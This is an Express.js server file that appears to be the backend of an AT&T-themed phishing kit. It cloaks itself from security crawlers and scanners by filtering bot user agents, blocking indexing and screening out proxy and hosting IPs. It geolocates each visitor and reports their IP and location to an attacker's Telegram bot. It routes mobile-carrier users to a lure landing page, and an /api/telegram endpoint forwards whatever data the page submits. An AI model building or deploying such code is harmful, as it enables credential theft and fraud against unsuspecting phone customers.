const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();
const port = process.env.PORT || 3000;

// IMPORTANT: Set these environment variables in your hosting provider
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE;
const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;

const MOBILE_ISPS = [
    'AT&T', 'Verizon', 'T-Mobile', 'Sprint', 'US Cellular', 'Cricket', 'Metro', 'Boost', 'Xfinity', 
    'Charter Communications Inc', ' Comcast Cable Communications, LLC', 'Verizon Business', 'T-Mobile USA, Inc.'
];

const BOT_USER_AGENTS = [
    'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'slurp', 'baiduspider', 'facebot', 'ia_archiver',
    'crawler', 'spider', 'robot', 'curl', 'wget', 'python', 'postman', 'insomnia', 'headless'
];

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAGE || !NON_ATT_LANDING_PAGE) {
    console.error('ERROR: All required environment variables must be set');
}

// Security: Use Helmet for security headers
app.use(helmet({
    contentSecurityPolicy: false, // Set to false if you have complex external scripts
}));

// Crawler Protection: Set X-Robots-Tag to prevent indexing
app.use((req, res, next) => {
    res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive');
    next();
});

// Rate Limiting: Prevent abuse
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per window
    standardHeaders: true,
    legacyHeaders: false,
    message: 'Too many requests, please try again later.'
});
app.use(limiter);

app.use(express.json());

// Serve only the index.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve robots.txt to disallow all crawlers
app.get('/robots.txt', (req, res) => {
    res.type('text/plain');
    res.send("User-agent: *\nDisallow: /");
});

// Helper to check for bots
function isBot(req) {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    if (!ua) return true;
    return BOT_USER_AGENTS.some(bot => ua.includes(bot));
}

// Main endpoint to determine redirect
app.get('/init', async (req, res) => {
    if (isBot(req)) {
        return res.json({ redirect: NON_ATT_LANDING_PAGE });
    }

    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
    
    let data = null;
    try {
        const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`);
        data = response.data;
    } catch (error) {
        console.error('ISP lookup failed:', error.message);
    }

    // Security: Filter out proxies, VPNs, and Hosting providers (crawlers often use these)
    const isSuspicious = data && (data.proxy || data.hosting);

    // Send Telegram Notification (only for real users, not suspicious ones)
    if (!isSuspicious) {
        let message = `🚀 *New App Visit!* \n\n`;
        if (data && data.status === 'success') {
            message += `📍 *IP:* ${data.query}\n` +
                       `🏢 *ISP:* ${data.isp || data.org || 'N/A'}\n` +
                       `🌍 *Location:* ${data.city}, ${data.regionName}, ${data.country}\n`;
        } else {
            message += `📍 *IP:* ${clientIp}\n⚠️ *ISP info unavailable*\n`;
        }
        message += `🕒 *Time:* ${new Date().toLocaleString()}`;

        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
        } catch (e) {}
    }

    // Determine Redirect URL
    let targetUrl = NON_ATT_LANDING_PAGE;
    if (data && data.status === 'success' && !isSuspicious) {
        const userISP = (data.isp || data.org || "").toUpperCase();
        if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
            targetUrl = '/go-att';
        }
    }

    res.json({ redirect: targetUrl });
});

// Redirect to AT&T landing page
app.get('/go-att', (req, res) => {
    res.redirect(ATT_LANDING_PAGE);
});

// Secured Telegram API
app.post('/api/telegram', async (req, res) => {
    if (isBot(req)) return res.status(403).send('Forbidden');

    const { message } = req.body;
    if (!message) return res.status(400).send('Message is required');

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        res.status(200).send('Message sent successfully');
    } catch (error) {
        console.error('Error sending message:', error.response?.data || error.message);
        res.status(500).send('Failed to send message');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
